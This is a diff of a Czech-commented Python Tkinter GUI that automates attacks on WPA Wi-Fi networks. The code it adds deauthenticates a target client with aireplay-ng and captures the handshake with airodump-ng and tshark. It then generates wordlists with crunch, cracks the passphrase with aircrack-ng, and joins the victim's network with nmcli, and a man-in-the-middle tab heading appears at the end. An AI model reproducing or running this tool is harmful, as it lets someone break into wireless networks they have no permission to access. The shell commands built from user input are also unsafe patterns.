@@ -3,6 +3,7 @@ import tkinter as tk
 from tkinter import ttk
 from tkinter import scrolledtext
 from tkinter import *
+from tkinter import filedialog
 import re
 from threading import Thread
 import time
@@ -17,18 +18,28 @@ interface = ""
 # Globální proměnná pro uchování reference na proces airodump-ng
 airodump_process = None
 airodump_client_process = None
+deauth_process = None
+aircrack_process = None
 # Globální flag pro ukončení threadu se čtením ze souboru
 stop_reading_file = False
 capture = None
 
+net = ""
 ap = ""
 cl = ""
 ch = ""
+password = ""
 
 output_airodump = "out_airdump"
-output_wpa = "out_wpa"
-
+output_handshake = "out_handshake"
+output_handshake_only = "eapol_only.cap"
+output_password = "password.txt"
 file_name = output_airodump + "-01.csv"
+# Uklidím případný soubor output_airodump-01.csv po předešlém spuštění
+if os.path.isfile(file_name):
+    os.remove(file_name)
+
+file_name = output_handshake + "-01.csv"
 # Uklidím případný soubor output_airodump-01.csv po předešlém spuštění
 if os.path.isfile(file_name):
     os.remove(file_name)
@@ -314,62 +325,304 @@ def find_channel_by_bssid(bssid):
             channel = channel[1:]
             return channel
     # Pokud 'BSSID' není nalezeno, vrátíme None
-    return None    
+    return None 
+# ========================================================================================================================
+def find_net_by_bssid(bssid):
+    """
+    Najde hodnotu sloupce 'ESSID' pro řádek se zadaným 'BSSID' v Treeview.
+    
+    :param bssid: hodnota 'BSSID', kterou chceme najít
+    :return: hodnota 'ESSID' nebo None, pokud není 'BSSID' nalezeno
+    """
+    # První sloupec (index 0) je 'BSSID' a čtvrtý sloupec (index 4) je 'channel'
+    bssid_column_index = 0  
+    net_column_index = 4  
+    bssid = bssid[1:]
+    # Procházení všech řádků v tree_ap
+    for child in tree_ap.get_children():
+        # Získání hodnot pro daný řádek
+        row_values = tree_ap.item(child, "values")
+        # Kontrola, zda hodnota 'BSSID' odpovídá hledané
+        if row_values[bssid_column_index] == bssid:
+            # Nalezeno, vrátíme hodnotu 'channel'
+            net = row_values[net_column_index]
+            net = net[1:]
+            return net
+    # Pokud 'BSSID' není nalezeno, vrátíme None
+    return None   
 # ========================================================================================================================
 def tree_cl_selected(Event):
     # Get selected item(s) on treeview_a
     selected_items = tree_cl.selection()
+
+    # TODO if selection is empty, then return else celej ten zbytek
     item = selected_items[0]
     item_values = tree_cl.item(item, "values")
 
+    global net
     global ap       
     global cl
     global ch
 
+    net = str(find_net_by_bssid(item_values[1])).strip()
     ap = item_values[1].strip()
     cl = item_values[0].strip()
     ch = str(find_channel_by_bssid(item_values[1])).strip()
 
+    target_net.configure(text=net)
     target_ap.configure(text=ap)
     target_cl.configure(text=cl)
     target_ch.configure(text=ch)
 # ========================================================================================================================
 # === T2 =================================================================================================================
-def start_wpa_catch():
-    wpa_catch_progress.start(10)
-    command_catch_wpa = f"sudo airodump-ng -c{ch} -d {ap} -w {output_wpa} {interface}"
-    #wpa_command_label.configure(text="Spouštěný příkaz: ")
-    wpa_command.configure(text=command_catch_wpa)
+def start_handshake_catch():
+    # Zapnu pobihani progress baru u WPA handshake zachyceni
+    handshake_catch_progress.start(10)
 
+    #Příkaz shellu airmon-ng, který budu spouštět v samostatném vlákně
+    command_catch_handshake = f"sudo airodump-ng -c{ch} -d {ap} -w {output_handshake} {interface}"
+
+    handshake_command.configure(text=command_catch_handshake)
+
+    # Nastavuji správně tlačítka
+    handshake_catch_on_button.configure(state=DISABLED) 
+    handshake_catch_off_button.configure(state=NORMAL) 
+
+    # Spouštím process zachytávání handshaku na zvoleném rozhrané
+    # TODO použití exception pro spuštění child processu
     global airodump_client_process
     global capture
 
-    wpa_catch_on_button.configure(state=DISABLED) 
-    wpa_catch_off_button.configure(state=NORMAL) 
+    airodump_client_process = subprocess.Popen(command_catch_handshake, shell=True, stdout=capture, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+    time.sleep(1)
 
-    airodump_client_process = subprocess.Popen(command_catch_wpa, shell=True, stdout=capture, stderr=subprocess.PIPE, preexec_fn=os.setsid)
-
-
+    # TEST =============================================
+    detect_eapol()
 
 # ========================================================================================================================
-def stop_wpa_catch():
-    wpa_catch_progress.stop()
-    wpa_catch_on_button.configure(state=NORMAL) 
-    wpa_catch_off_button.configure(state=DISABLED) 
+def stop_handshake_catch():
+    # Zastavuji progress bar pro zachytavani handshaku
+    handshake_catch_progress.stop()
+
+    global airodump_client_process
+    if airodump_client_process:
+        os.killpg(os.getpgid(airodump_client_process.pid), signal.SIGTERM)
+        print("  -- Process zachytávání handshaku byl ukončen.")
+
+    # Nastavuji správně tlačítka
+    handshake_catch_on_button.configure(state=NORMAL) 
+    handshake_catch_off_button.configure(state=DISABLED) 
 
 # ========================================================================================================================
 def start_deauth():
     deauth_progress.start(10)
-    deauth_cadency = 0
-    command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} -c {cl} -a {ap} {interface}"
+    #deauth_cadency = 0
+    # Testování funkčních hodnot ( --ignore-negative-one  )
+    deauth_cadency = 10
+    command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} -D -c {cl} -a {ap} {interface}"
+
     #deauth_command_label.configure(text="Spouštěný příkaz: ")
     deauth_command.configure(text=command_deauth)
 
+    # Spouštím proces posílání deauthentifikačních rámců na klienta
+    global deauth_process 
+    deauth_process = subprocess.Popen(command_deauth, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+
+    # Nastavuji správně tlačítka
+    deauth_on_button.configure(state=DISABLED) 
+    deauth_off_button.configure(state=NORMAL) 
 # ========================================================================================================================
 def stop_deauth():
+    # Zastavuji progress bar pro zachytavani handshaku
     deauth_progress.stop()
+
+    # Zastavuji process posílání deauth paketů
+    global deauth_process
+    if deauth_process:
+        os.killpg(os.getpgid(deauth_process.pid), signal.SIGTERM)
+        print("  -- Process posílání deauth rámců byl ukončen.")
+
+    # Nastavuji správně tlačítka
     deauth_on_button.configure(state=NORMAL) 
-    deauth_off_button.configure(state=DISABLED) 
+    deauth_off_button.configure(state=DISABLED)
+# ========================================================================================================================
+def parse_handshake_cap(eapol_command):
+    captured = False
+    print("Začínám cyklus čtení wpa-good")
+    print("Captured: " + str(captured))
+    print("Command: "+ eapol_command)
+    print("Handshake only file: "+ output_handshake_only)
+
+    while not captured:
+        try:
+            subprocess.run(eapol_command, shell=True, check=True)
+            #with open(output_handshake_only, "r") as file:
+            #    lines = file.readlines()
+            if os.path.exists(output_handshake_only):
+                file_size = os.path.getsize(output_handshake_only)
+                if file_size >= 500:
+                    handshake_finished_label.config(text="Handshake byl zachycen!", fg='green')
+                    captured = True
+                else:
+                    handshake_finished_label.config(text="Handshake ještě nebyl zachycen...", fg='grey')
+        except FileNotFoundError:
+            label_text = "File not found. Waiting..."
+         
+        # Kontroluji soubor každou sekundu
+        time.sleep(1)  # Wait for 1 second before checking again
+    print("Zachycen HS, ukončuji vlakno.")
+# =======================================================================================================================
+def detect_eapol():
+    print("START parsovani wpa-good.")
+    global output_handshake_only
+    print("Output file: "+ output_handshake_only)
+    eapol_command = f"tshark -r wpa-good.cap -Y \"eapol\" -w {output_handshake_only}"
+    print("Command: " + eapol_command)
+    # Run the task in a separate thread to avoid blocking the main program or GUI
+    Thread(target=parse_handshake_cap(eapol_command), daemon=True).start
+    print("END parsovani wpa-good.")
+# ========================================================================================================================
+# ========================================================================================================================
+def crunch(min, max, chars, output):
+    command = f"crunch {min} {max} {chars} -o {output}"
+    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+
+def create_wordlist():
+    #global create_wl_progress
+    create_wl_progress.grid(row=4,column=0,columnspan=4)
+    create_wl_progress.start(10)
+    min = wl_min_entry.get()
+    max = wl_max_entry.get()
+    chars = wl_char_entry.get()
+    output = wl_name_entry.get()
+    #print("after button: " + min + ", " + max + ", " + chars + ", " + output)
+    # Je nutné to tady vůbec dávat do samostatného vlákna? TODO otestovat na obrovském souboru hesel....
+    thr = Thread(target=crunch(min, max, chars, output), daemon=True)
+    thr.start()
+    thr.join()
+    create_wl_progress.stop()
+    create_wl_progress.grid_forget()
+    status.config(text="Slovník hesel byl úspěšně vytvořen!")
+    wordlist_name_label.config(text=os.getcwd()+"/"+output)
+# ========================================================================================================================
+def load_wordlist():
+    root.filename = filedialog.askopenfilename(title="Zvol textový soubor se slovníkem hesel")  
+    global wordlist_name
+    wordlist_name = root.filename
+    #print("Wordlist: "+wordlist_name) 
+    wordlist_name_label.config(text=wordlist_name)
+    load_wordlist_frame.config(background="green")      # TADY JE TO OK !!!!!!!!!!!!!!!!!
+    crack_pw_frame.config(highlightbackground="green")  # TADY JE TO OK !!!!!!!!!!!!!!!!!
+# ========================================================================================================================
+# ========================================================================================================================
+def secs_to_str(seconds):
+        """Human-readable seconds. 193 -> 3m13s"""
+        if seconds < 0:
+            return '-%ds' % seconds
+
+        rem = int(seconds)
+        hours = rem // 3600
+        mins = int((rem % 3600) / 60)
+        secs = rem % 60
+        if hours > 0:
+            return '%dh%dm%ds' % (hours, mins, secs)
+        elif mins > 0:
+            return '%dm%ds' % (mins, secs)
+        else:
+            return '%ds' % secs
+# ========================================================================================================================
+def aircrack(capfile, wordlist):
+    command = f"aircrack-ng {capfile} -w {wordlist}"
+    global aircrack_process
+    aircrack_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+    #grep_aircrack_process()
+# ========================================================================================================================
+def grep_aircrack_process():
+    # Report progress of cracking
+    aircrack_nums_re = re.compile(r'(\d+)/(\d+) keys tested.*\(([\d.]+)\s+k/s')
+    aircrack_key_re = re.compile(r'Current passphrase:\s*(\S.*\S)\s*$')
+    num_tried = num_total = 0
+    percent = num_kps = 0.0
+    eta_str = 'unknown'
+    current_key = ''
+    while aircrack_process.poll() is None:
+        line = aircrack_process.stdout.readline()
+        match_nums = aircrack_nums_re.search(line.decode('utf-8'))
+        match_keys = aircrack_key_re.search(line.decode('utf-8'))
+        if match_nums:
+            num_tried = int(match_nums[1])
+            num_total = int(match_nums[2])
+            num_kps = float(match_nums[3])
+            eta_seconds = (num_total - num_tried) / num_kps
+            eta_str = secs_to_str(eta_seconds)
+            percent = 100.0 * float(num_tried) / float(num_total)
+        elif match_keys:
+            current_key = match_keys[1]
+        else:
+            continue
+
+        progress = 'Lámání WPA Handshaku: %0.2f%%' % percent
+        progress += ' ETA: %s' % eta_str
+        progress += ' (aktuální klíč: %s)' % current_key
+        crack_pw_progress['value']=int(percent)
+        crack_pw_current_line_label.config(text=progress)
+
+        if not os.path.isfile(output_password):
+            status.configure(text="Heslo nebylo prolomeno...")
+            return
+
+    # Vypíšu nalezené heslo do odpovídajícího labelu
+    with open(output_password, 'r', encoding='utf-8') as file:
+        global password
+        password = file.readline()
+        password_label.config(text=password)
+
+    # Ukončím běhání progress baru
+    print("Konec lámání hesla!")
+    crack_pw_progress.stop()
+    crack_pw_progress.grid_forget()
+# ========================================================================================================================
+def crack_pw():
+    crack_pw_progress.grid(row=3,column=0,columnspan=2)
+    status.config(text="Lámání hesla")
+
+    capfile = "wpa-good.cap"        # TODO změnit na fungující hovno !!!!!!!!!!!!!!!!
+
+    command = f"aircrack-ng {capfile} -w {wordlist_name} -l {output_password}"
+    global aircrack_process
+    aircrack_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+    Thread(target=grep_aircrack_process, daemon=True).start()
+    status.config(text="Heslo bylo úspěšně prolomeno!")
+
+# ========================================================================================================================
+# ========================================================================================================================
+def connect_to_wifi():
+    try:
+        # Deaktivujte rozhraní
+        subprocess.run(['ifconfig', interface, 'down'], check=True)
+        # Zastavit monitorovací mód
+        subprocess.run(['airmon-ng', 'stop', interface], check=True)
+        # Restartuji službu NetworkManager
+        subprocess.run(['service', 'NetworkManager', 'restart'], check=True)
+        
+        print(f"Rozhraní {interface} bylo úspěšně přepnuto do normálního módu.")
+        
+        global net
+        global password
+        #global interface
+        command = f"nmcli wifi connect {net} password {password} ifname {interface}"
+
+        print("COMMAND: " + command)
+        # Připojení se k Wi-Fi síti
+        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+
+        status.config(text=f"Úspěšně připojeno k cílové Wi-fi síti!")
+        connect_button.configure(state=DISABLED) ########################################################################
+
+    except subprocess.CalledProcessError as e:
+        status.config(text=f"Chyba při npřipojování k síti: {e}")
+        print(f"Chyba při připojování k síti: {e}")
+
 # ========================================================================================================================
 # ========================================================================================================================
 # Funkce pro změnu tabu
@@ -503,44 +756,50 @@ tree_cl.grid(row=4, column=0, columnspan=3, sticky=W)
 #scrollbarv_cl.pack(side='right', fill='y')
 #tree_cl.configure(yscrollcommand=scrollbarv_cl.set)
 
+target_net_label = Label(airodump_frame, text="TARGET NETWORK:", font=('Helvetica', 20))
+target_net = Label(airodump_frame, text="", font=('Helvetica', 20), fg='green')
 target_ap_label = Label(airodump_frame, text="TARGET ACCES POINT:", font=('Helvetica', 20))
 target_ap = Label(airodump_frame, text="", font=('Helvetica', 20), fg='green')
 target_cl_label = Label(airodump_frame, text="TARGET CLIENT:", font=('Helvetica', 20))
 target_cl = Label(airodump_frame, text="", font=('Helvetica', 20), fg='green')
 target_ch_label = Label(airodump_frame, text="TARGET CHANNEL:", font=('Helvetica', 20))
 target_ch = Label(airodump_frame, text="", font=('Helvetica', 20), fg='green')
-target_ap_label.grid(row=5, column=0, sticky=W)
-target_ap.grid(row=5, column=1, sticky=W)
-target_cl_label.grid(row=6, column=0, sticky=W)
-target_cl.grid(row=6, column=1, sticky=W)
-target_ch_label.grid(row=7, column=0, sticky=W)
-target_ch.grid(row=7, column=1, sticky=W)
+target_net_label.grid(row=5, column=0, sticky=W)
+target_net.grid(row=5, column=1, sticky=W)
+target_ap_label.grid(row=6, column=0, sticky=W)
+target_ap.grid(row=6, column=1, sticky=W)
+target_cl_label.grid(row=7, column=0, sticky=W)
+target_cl.grid(row=7, column=1, sticky=W)
+target_ch_label.grid(row=8, column=0, sticky=W)
+target_ch.grid(row=8, column=1, sticky=W)
 
 # ========================================================================================================================================
 # Tab "Záchyt handshaku" =================================================================================================================
 
 # WPA Catch Frame ========================================================================================================================
-wpa_catch_frame = LabelFrame(frame_t2, text="Záchyt WPA handshaku")
-wpa_catch_frame.pack(padx=10,pady=5, fill='x')
+handshake_catch_frame = LabelFrame(frame_t2, text="Záchyt WPA handshaku")
+handshake_catch_frame.pack(padx=10,pady=5, fill='x')
 
-wpa_catch_label = Label(wpa_catch_frame, text="Spustit proces na zachytávání komunikace Clienta s AP a zachycením WPA handshaku:")
-wpa_catch_on_button = Button(wpa_catch_frame, text="Spustit", command=start_wpa_catch)
-wpa_catch_off_button = Button(wpa_catch_frame, text="Zastavit", state=DISABLED, command=stop_wpa_catch)
-wpa_catch_label.grid(row=0, column=0)
-wpa_catch_on_button.grid(row=0,column=1, pady=5)
-wpa_catch_off_button.grid(row=0,column=2, pady=5)
+handshake_catch_label = Label(handshake_catch_frame, text="Spustit proces na zachytávání komunikace Clienta s AP a zachycením WPA handshaku:")
+#handshake_catch_on_button = Button(handshake_catch_frame, text="Spustit", command=start_handshake_catch)
+handshake_catch_on_button = Button(handshake_catch_frame, text="Spustit", command=detect_eapol)
+handshake_catch_off_button = Button(handshake_catch_frame, text="Zastavit", state=DISABLED, command=stop_handshake_catch)
+handshake_catch_label.grid(row=0, column=0)
+handshake_catch_on_button.grid(row=0,column=1, pady=5)
+handshake_catch_off_button.grid(row=0,column=2, pady=5)
 
-wpa_catch_progress = ttk.Progressbar(wpa_catch_frame, orient=HORIZONTAL, length=800, mode='indeterminate')
-wpa_catch_progress.step(0)
-wpa_catch_progress.grid(row=1,column=0,columnspan=3)
+handshake_catch_progress = ttk.Progressbar(handshake_catch_frame, orient=HORIZONTAL, length=800, mode='indeterminate')
+handshake_catch_progress.step(0)
+handshake_catch_progress.grid(row=1,column=0,columnspan=3)
 
-#wpa_command_label = Label(wpa_catch_frame, text="")
-wpa_command = Label(wpa_catch_frame, text="")
-#wpa_command_label.grid(row=2, column=1)
-wpa_command.grid(row=2, column=0, columnspan=3)
+handshake_command = Label(handshake_catch_frame, text="")
+handshake_command.grid(row=2, column=0, columnspan=3)
 
-WPA_catch_textarea = scrolledtext.ScrolledText(wpa_catch_frame, wrap=tk.WORD, width=98, height=20)
-WPA_catch_textarea.grid(row=3, column=0, columnspan=3, padx=10, pady=10)
+#handshake_catch_textarea = scrolledtext.ScrolledText(handshake_catch_frame, wrap=tk.WORD, width=98, height=20)
+#handshake_catch_textarea.grid(row=3, column=0, columnspan=3, padx=10, pady=10)
+
+handshake_finished_label = Label(handshake_catch_frame, text="Spusťte zachytávání handshaku!", font=('Helvetica', 20))
+handshake_finished_label.grid(row=3, column=0, columnspan=3, padx=10, pady=10)
 
 # Deauthificate Frame ========================================================================================================================
 deauth_frame = LabelFrame(frame_t2, text="Deauthentifikace target klienta")
@@ -557,13 +816,82 @@ deauth_progress = ttk.Progressbar(deauth_frame, orient=HORIZONTAL, length=800, m
 deauth_progress.step(0)
 deauth_progress.grid(row=1,column=0,columnspan=3)
 
-#deauth_command_label = Label(deauth_frame, text="")
 deauth_command = Label(deauth_frame, text="")
-#deauth_command_label.grid(row=2, column=1)
 deauth_command.grid(row=2, column=0, columnspan=3)
 
-
+# ========================================================================================================================================
 # Tab "Prolomení hesla" ==================================================================================================================
+
+# Create Wordlist Frame ========================================================================================================================
+password_frame = LabelFrame(frame_t3, text="Prolomení zachyceného hesla")
+password_frame.pack(padx=10,pady=5, fill='x')
+
+create_wordlist_frame = LabelFrame(frame_t3, text="Vytvořit slovník hesel")
+create_wordlist_frame.pack(padx=10,pady=5, fill='x')
+
+wl_label = Label(create_wordlist_frame, text="Parametry vytvářeného slovníku hesel:")
+wl_min_label = Label(create_wordlist_frame, text="Minimální počet znaků:")
+wl_max_label = Label(create_wordlist_frame, text="Maximální počet znaků:")
+wl_char_label = Label(create_wordlist_frame, text="Použité znaky:")
+wl_name_label = Label(create_wordlist_frame, text="Název souboru:")
+wl_min_entry = Entry(create_wordlist_frame, width=20)
+wl_max_entry = Entry(create_wordlist_frame, width=20)
+wl_char_entry = Entry(create_wordlist_frame, width=20)
+wl_name_entry = Entry(create_wordlist_frame, width=20)
+
+wl_label.grid(row=0 , column=0)
+wl_min_label.grid(row=1 , column=0)
+wl_max_label.grid(row=1 , column=2)
+wl_char_label.grid(row=2 , column=0)
+wl_name_label.grid(row=2 , column=2)
+wl_min_entry.grid(row=1 , column=1)
+wl_max_entry.grid(row=1 , column=3)
+wl_char_entry.grid(row=2 , column=1)
+wl_name_entry.grid(row=2 , column=3)
+
+create_wl_button = Button(create_wordlist_frame, text="Vytvořit", command=create_wordlist)
+create_wl_button.grid(row=3, column=1, columnspan=2)
+
+create_wl_progress = ttk.Progressbar(create_wordlist_frame, orient=HORIZONTAL, length=800, mode='indeterminate')
+create_wl_progress.step(0)
+
+# Load Wordlist Frame ========================================================================================================================
+load_wordlist_frame = LabelFrame(frame_t3, text="Načíst hotový slovník hesel", highlightthickness=2)
+load_wordlist_frame.pack(padx=10,pady=5, fill='x')
+
+load_wl_button = Button(load_wordlist_frame, text="Načíst slovník hesel", command=load_wordlist)
+load_wl_button.grid(row=0, column=1, columnspan=2)
+
+# Crack the password Frame ========================================================================================================================
+crack_pw_frame = LabelFrame(frame_t3, text="Prolomit heslo sítě hrubou silou", highlightthickness=4)
+crack_pw_frame.pack(padx=10,pady=5, fill='x')
+
+crack_pw_label  =Label(crack_pw_frame, text="Zvolený soubor:")
+wordlist_name = ""
+wordlist_name_label = Label(crack_pw_frame, text=wordlist_name)
+crack_pw_label.grid(row=0, column=0)
+wordlist_name_label.grid(row=0, column=1)
+
+crack_pw_button = Button(crack_pw_frame, text="Prolomit heslo", command=crack_pw)
+crack_pw_button.grid(row=1, column=0, columnspan=2)
+
+crack_pw_progress = ttk.Progressbar(crack_pw_frame, orient=HORIZONTAL, length=800, mode='determinate')
+crack_pw_progress.step(0)
+
+crack_pw_current_line_label = Label(crack_pw_frame, text="foo")  # TODO rename
+crack_pw_current_line_label.grid(row=2, column=0, columnspan=2)
+
+# Network Connection Frame ========================================================================================================================
+connect_frame = LabelFrame(frame_t3, text="Připojit se k cílové Wi-Fi síti", highlightthickness=4)
+connect_frame.pack(padx=10,pady=5, fill='x')
+
+password_info_label = Label(connect_frame, text="Heslo k Wi-fi síti: ")
+password_label = Label(connect_frame, text="", font=('Helvetica', 20), fg='green')
+password_info_label.grid(row=0, column=0)
+password_label.grid(row=0, column=1)
+
+connect_button = Button(connect_frame, text="Připojit se k síti", command=connect_to_wifi)
+connect_button.grid(row=1, column=1, columnspan=2)
 
 
 # Tab "Man-in-the-middle" ================================================================================================================
